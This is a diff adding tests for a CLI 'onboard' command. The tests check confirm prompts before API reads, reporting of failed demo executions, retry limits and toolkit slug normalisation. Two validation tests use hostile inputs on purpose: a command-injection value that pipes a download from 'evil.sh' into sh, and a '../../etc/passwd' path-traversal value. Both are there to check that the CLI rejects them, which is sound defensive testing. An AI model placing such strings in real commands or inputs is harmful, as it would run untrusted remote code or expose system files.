@@ -1,7 +1,7 @@
 import { describe, expect, layer } from '@effect/vitest';
 import { afterEach, vi } from 'vitest';
 import { HelpDoc, ValidationError } from '@effect/cli';
-import { ConfigProvider, Console, Effect, Option } from 'effect';
+import { Cause, ConfigProvider, Console, Effect, Option } from 'effect';
 import type { ConnectedAccountItem } from 'src/models/connected-accounts';
 import { CommandExecutor } from '@effect/platform';
 import { extendConfigProvider } from 'src/services/config';
@@ -100,6 +100,12 @@ const soleDocument = (stdout: ReadonlyArray<string>): Doc => {
 const mockedExecute = (result: RunToolsExecuteResult) =>
   Effect.succeed(result) as ReturnType<typeof executeCmd.runToolsExecute>;
 
+/** Same cast, for the branch where the delegate fails outright rather than returning a result. */
+const failedExecute = () =>
+  Effect.fail(new Error('the provider rejected the call')) as ReturnType<
+    typeof executeCmd.runToolsExecute
+  >;
+
 const liveInput = (
   overrides: Partial<TestLiveInput> & { terminalUI: TestLiveInput['terminalUI'] }
 ): TestLiveInput => ({
@@ -134,6 +140,27 @@ describe('CLI: composio onboard', () => {
         expect(ValidationError.isValidationError(error)).toBe(true);
         if (!ValidationError.isValidationError(error)) return;
         expect(HelpDoc.toAnsiText(error.error)).toContain('`--task` cannot be empty.');
+      })
+    );
+
+    it.scoped('[Given] --toolkit with shell metacharacters [Then] fails before any fact', () =>
+      Effect.gen(function* () {
+        // The value reaches `next_command` and `human_action`, both of which callers exec.
+        const error = yield* cli(['onboard', '--toolkit', 'github; curl evil.sh | sh']).pipe(
+          Effect.flip
+        );
+
+        expect(ValidationError.isValidationError(error)).toBe(true);
+        if (!ValidationError.isValidationError(error)) return;
+        expect(HelpDoc.toAnsiText(error.error)).toContain('--toolkit');
+      })
+    );
+
+    it.scoped('[Given] --toolkit with a path separator [Then] fails as a usage error', () =>
+      Effect.gen(function* () {
+        const error = yield* cli(['onboard', '--toolkit', '../../etc/passwd']).pipe(Effect.flip);
+
+        expect(ValidationError.isValidationError(error)).toBe(true);
       })
     );
 
@@ -548,6 +575,368 @@ describe('CLI: composio onboard', () => {
           })
         );
       });
+    });
+  });
+
+  // ── The read demo against a target the caller never named ───────────────────
+
+  describe('a connected toolkit nobody asked about', () => {
+    const connected = [account({ id: 'con_github', status: 'ACTIVE' })];
+
+    describe('when the confirm is declined', () => {
+      const recorded = recordingUI({
+        tty: { stdin: true, stdout: true, stderr: true },
+        confirmAnswers: [false],
+      });
+
+      layer(
+        TestLive(
+          liveInput({ terminalUI: recorded.ui, connectedAccountsData: { items: connected } })
+        )
+      )(it => {
+        it.scoped('makes no API read', () =>
+          Effect.gen(function* () {
+            recorded.reset();
+            const confirmSpy = vi.spyOn(recorded.ui, 'confirm');
+            const executeSpy = vi.spyOn(executeCmd, 'runToolsExecute');
+
+            yield* cli(['onboard']);
+
+            expect(confirmSpy).toHaveBeenCalledTimes(1);
+            expect(executeSpy).not.toHaveBeenCalled();
+          })
+        );
+      });
+    });
+
+    describe('when the confirm is accepted', () => {
+      const recorded = recordingUI({
+        tty: { stdin: true, stdout: true, stderr: true },
+        confirmAnswers: [true],
+      });
+
+      layer(
+        TestLive(
+          liveInput({ terminalUI: recorded.ui, connectedAccountsData: { items: connected } })
+        )
+      )(it => {
+        it.scoped('runs the curated read for the toolkit already connected', () =>
+          Effect.gen(function* () {
+            recorded.reset();
+            const executeSpy = vi.spyOn(executeCmd, 'runToolsExecute').mockReturnValue(
+              mockedExecute({
+                kind: 'tool_execution',
+                successful: true,
+                slug: 'GITHUB_GET_THE_AUTHENTICATED_USER',
+                data: { login: 'jkomyno' },
+              })
+            );
+
+            yield* cli(['onboard']);
+
+            expect(executeSpy.mock.calls.map(call => call[0].slug)).toContain(
+              'GITHUB_GET_THE_AUTHENTICATED_USER'
+            );
+          })
+        );
+      });
+    });
+
+    describe('when --yes pre-answers it', () => {
+      const recorded = recordingUI({ tty: { stdin: true, stdout: true, stderr: true } });
+
+      layer(
+        TestLive(
+          liveInput({ terminalUI: recorded.ui, connectedAccountsData: { items: connected } })
+        )
+      )(it => {
+        it.scoped('asks nothing and still runs the read', () =>
+          Effect.gen(function* () {
+            recorded.reset();
+            const confirmSpy = vi.spyOn(recorded.ui, 'confirm');
+            const executeSpy = vi.spyOn(executeCmd, 'runToolsExecute').mockReturnValue(
+              mockedExecute({
+                kind: 'tool_execution',
+                successful: true,
+                slug: 'GITHUB_GET_THE_AUTHENTICATED_USER',
+                data: { login: 'jkomyno' },
+              })
+            );
+
+            yield* cli(['onboard', '--yes']);
+
+            const readCall = confirmSpy.mock.calls.find(call =>
+              call[0].includes('GITHUB_GET_THE_AUTHENTICATED_USER')
+            );
+            expect(readCall).toBeUndefined();
+            expect(executeSpy.mock.calls.map(call => call[0].slug)).toContain(
+              'GITHUB_GET_THE_AUTHENTICATED_USER'
+            );
+          })
+        );
+      });
+    });
+  });
+
+  // ── A failed read demo is reported, not replayed ────────────────────────────
+
+  describe('a read demo that does not succeed', () => {
+    const connected = [account({ id: 'con_github', status: 'ACTIVE' })];
+
+    describe('when the delegate fails', () => {
+      const recorded = recordingUI({ tty: { stdin: true, stdout: true, stderr: true } });
+
+      layer(
+        TestLive(
+          liveInput({ terminalUI: recorded.ui, connectedAccountsData: { items: connected } })
+        )
+      )(it => {
+        it.scoped('blocks the document instead of looking like it never ran', () =>
+          Effect.gen(function* () {
+            recorded.reset();
+            const executeSpy = vi
+              .spyOn(executeCmd, 'runToolsExecute')
+              .mockReturnValue(failedExecute());
+
+            yield* cli(['onboard', '--json', '--toolkit', 'github']);
+
+            expect(executeSpy).toHaveBeenCalledTimes(1);
+
+            const document = soleDocument(recorded.stdout);
+            expect(document.blocked).toBe(true);
+            expect(document.blocked_reason).toBe('demo_execution_failed');
+            expect(document.human_action).toContain('GITHUB_GET_THE_AUTHENTICATED_USER');
+            // A command here would hand back the call that just failed.
+            expect(document.next_command).toBeNull();
+          })
+        );
+      });
+    });
+
+    describe('when the delegate returns something other than an execution', () => {
+      const recorded = recordingUI({ tty: { stdin: true, stdout: true, stderr: true } });
+
+      layer(
+        TestLive(
+          liveInput({ terminalUI: recorded.ui, connectedAccountsData: { items: connected } })
+        )
+      )(it => {
+        it.scoped('reports it the same way rather than returning silently', () =>
+          Effect.gen(function* () {
+            recorded.reset();
+            vi.spyOn(executeCmd, 'runToolsExecute').mockReturnValue(
+              mockedExecute({ kind: 'skipped', reason: 'unauthenticated' })
+            );
+
+            yield* cli(['onboard', '--json', '--toolkit', 'github']);
+
+            const document = soleDocument(recorded.stdout);
+            expect(document.blocked).toBe(true);
+            expect(document.blocked_reason).toBe('demo_execution_failed');
+          })
+        );
+      });
+    });
+
+    describe('with a human at the keyboard', () => {
+      const recorded = recordingUI({ tty: { stdin: true, stdout: false, stderr: true } });
+
+      layer(
+        TestLive(
+          liveInput({ terminalUI: recorded.ui, connectedAccountsData: { items: connected } })
+        )
+      )(it => {
+        it.scoped('attempts the read once, not once per allowed advance', () =>
+          Effect.gen(function* () {
+            recorded.reset();
+            const executeSpy = vi
+              .spyOn(executeCmd, 'runToolsExecute')
+              .mockReturnValue(failedExecute());
+
+            yield* cli(['onboard', '--toolkit', 'github']);
+
+            expect(executeSpy).toHaveBeenCalledTimes(1);
+          })
+        );
+      });
+    });
+  });
+
+  // ── An advance that changes no fact is not retried ──────────────────────────
+
+  describe('a delegate that cannot advance its gate', () => {
+    describe('the link delegate, with a human at the keyboard', () => {
+      const recorded = recordingUI({ tty: { stdin: true, stdout: false, stderr: true } });
+
+      layer(TestLive(liveInput({ terminalUI: recorded.ui, connectedAccountsData: { items: [] } })))(
+        it => {
+          it.scoped('creates one authorization attempt, not three', () =>
+            Effect.gen(function* () {
+              recorded.reset();
+              const linkSpy = vi
+                .spyOn(linkCmd, 'runConnectedAccountsLink')
+                .mockReturnValue(
+                  Effect.succeed({ kind: 'not_started', reason: 'no_managed_auth' as const })
+                );
+
+              yield* cli(['onboard', '--toolkit', 'github']);
+
+              expect(linkSpy).toHaveBeenCalledTimes(1);
+            })
+          );
+        }
+      );
+    });
+
+    describe('the login delegate, with a human at the keyboard', () => {
+      const recorded = recordingUI({ tty: { stdin: true, stdout: false, stderr: true } });
+
+      layer(TestLive({ commandRunner: noHostsRunner, terminalUI: recorded.ui }))(it => {
+        it.scoped('mints one session and opens one browser tab, not three', () =>
+          Effect.gen(function* () {
+            recorded.reset();
+            const loginSpy = vi
+              .spyOn(loginCmd, 'browserLogin')
+              .mockReturnValue(
+                Effect.fail(new Cause.NoSuchElementException('login timed out')) as ReturnType<
+                  typeof loginCmd.browserLogin
+                >
+              );
+
+            yield* cli(['onboard']);
+
+            expect(loginSpy).toHaveBeenCalledTimes(1);
+          })
+        );
+      });
+    });
+
+    describe('a minted link the list call has not caught up with', () => {
+      const recorded = recordingUI({ tty: { stdin: true, stdout: false, stderr: true } });
+
+      layer(TestLive(liveInput({ terminalUI: recorded.ui, connectedAccountsData: { items: [] } })))(
+        it => {
+          it.scoped('reports the URL it minted and stops instead of minting another', () =>
+            Effect.gen(function* () {
+              recorded.reset();
+              const linkSpy = vi.spyOn(linkCmd, 'runConnectedAccountsLink').mockReturnValue(
+                Effect.succeed({
+                  kind: 'pending',
+                  connectedAccountId: 'con_github_pending',
+                  redirectUrl: 'https://app.composio.dev/link?token=lt_fresh',
+                  toolkit: 'github',
+                })
+              );
+
+              yield* cli(['onboard', '--toolkit', 'github']);
+
+              expect(linkSpy).toHaveBeenCalledTimes(1);
+
+              const document = soleDocument(recorded.stdout);
+              expect(document.gates.connect.status).toBe('blocked');
+              expect(document.gates.connect.redirect_url).toBe(
+                'https://app.composio.dev/link?token=lt_fresh'
+              );
+            })
+          );
+        }
+      );
+    });
+  });
+
+  // ── The starter-task picker ─────────────────────────────────────────────────
+
+  describe('the starter-task picker', () => {
+    describe('when it is cancelled', () => {
+      const recorded = recordingUI({ tty: { stdin: true, stdout: false, stderr: true } });
+
+      layer(TestLive(liveInput({ terminalUI: recorded.ui, connectedAccountsData: { items: [] } })))(
+        it => {
+          it.scoped('authorizes nothing and reports the missing toolkit', () =>
+            Effect.gen(function* () {
+              recorded.reset();
+              const linkSpy = vi.spyOn(linkCmd, 'runConnectedAccountsLink');
+
+              // No scripted answer: `selectOption` answers `None`, which is what a cancel produces.
+              yield* cli(['onboard']);
+
+              expect(linkSpy).not.toHaveBeenCalled();
+
+              const document = soleDocument(recorded.stdout);
+              expect(document.blocked).toBe(true);
+              expect(document.blocked_reason).toBe('toolkit_required');
+            })
+          );
+        }
+      );
+    });
+
+    describe('when a task is chosen', () => {
+      const recorded = recordingUI({
+        tty: { stdin: true, stdout: false, stderr: true },
+        selectAnswers: ['gmail'],
+      });
+
+      layer(TestLive(liveInput({ terminalUI: recorded.ui, connectedAccountsData: { items: [] } })))(
+        it => {
+          it.scoped('authorizes the chosen toolkit', () =>
+            Effect.gen(function* () {
+              recorded.reset();
+              const linkSpy = vi
+                .spyOn(linkCmd, 'runConnectedAccountsLink')
+                .mockReturnValue(
+                  Effect.succeed({ kind: 'not_started', reason: 'request_failed' as const })
+                );
+
+              yield* cli(['onboard']);
+
+              expect(linkSpy).toHaveBeenCalledTimes(1);
+              expect(Option.getOrNull(linkSpy.mock.calls[0]![0].toolkit)).toBe('gmail');
+            })
+          );
+        }
+      );
+    });
+  });
+
+  // ── Slug normalization ──────────────────────────────────────────────────────
+
+  describe('--toolkit is compared against the API in one casing', () => {
+    const recorded = recordingUI({ tty: { stdin: true, stdout: false, stderr: true } });
+
+    layer(
+      TestLive(
+        liveInput({
+          terminalUI: recorded.ui,
+          connectedAccountsData: { items: [account({ id: 'con_github', status: 'ACTIVE' })] },
+        })
+      )
+    )(it => {
+      it.scoped('resolves a mixed-case value against the lowercase slug it names', () =>
+        Effect.gen(function* () {
+          recorded.reset();
+          const linkSpy = vi.spyOn(linkCmd, 'runConnectedAccountsLink');
+          const executeSpy = vi.spyOn(executeCmd, 'runToolsExecute').mockReturnValue(
+            mockedExecute({
+              kind: 'tool_execution',
+              successful: true,
+              slug: 'GITHUB_GET_THE_AUTHENTICATED_USER',
+              data: { login: 'jkomyno' },
+            })
+          );
+
+          yield* cli(['onboard', '--toolkit', 'GitHub']);
+
+          // Without normalization the connect gate never matches the live account, so onboard
+          // re-links instead of reaching the demo.
+          expect(linkSpy).not.toHaveBeenCalled();
+          expect(executeSpy).toHaveBeenCalledTimes(1);
+
+          const document = soleDocument(recorded.stdout);
+          expect(document.toolkit).toBe('github');
+          expect(document.gates.connect.status).toBe('satisfied');
+        })
+      );
     });
   });
 
